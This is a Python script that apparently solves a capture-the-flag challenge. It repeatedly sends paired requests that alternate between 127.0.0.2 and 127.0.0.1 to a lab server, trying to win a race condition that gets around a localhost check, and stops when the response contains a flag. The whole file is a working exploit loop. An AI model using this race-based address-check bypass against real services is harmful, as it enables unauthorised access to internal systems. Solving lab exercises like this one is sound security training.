import socket
import time
import sys

HOST = "up.zoolab.org"
PORT = 10932

# Files to alternate requests for
get = b"g\n"
view = b"v\n"

host1_str = "127.0.0.2/10000"
host2_str = "127.0.0.1/10000"

host1 = (host1_str + "\n").encode()
host2 = (host2_str + "\n").encode()
count = 0

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        response = s.recv(1024) 
        while True:
            count += 1
            print(f"Attempt {count}")
            payload = get + host1 + get + host2
            s.sendall(payload)
            # Send the two requests back-to-back
            response = s.recv(1024)
            response = s.recv(1024)
            # Give a short time for the server to process and respond
            s.settimeout(5.0) # Set a timeout for reading response
            s.sendall(view)
            try:
                response = s.recv(4096)
                response = s.recv(4096)
                response_str = response.decode('utf-8', errors='ignore')
                print(response_str)
                if "FLAG" in response_str:
                    print(response_str)
                    sys.exit(0)
            except socket.timeout:
                print("Socket timed out waiting for response.")
            except Exception as e:
                print(f"Error reading response: {e}")
except ConnectionRefusedError:
        print(f"Connection refused to {HOST}:{PORT}. Server down?")
        time.sleep(2)
except socket.gaierror:
    print(f"Could not resolve hostname: {HOST}")
except Exception as e:
    print(f"An error occurred: {e}")
    time.sleep(0.1) # Small delay before retrying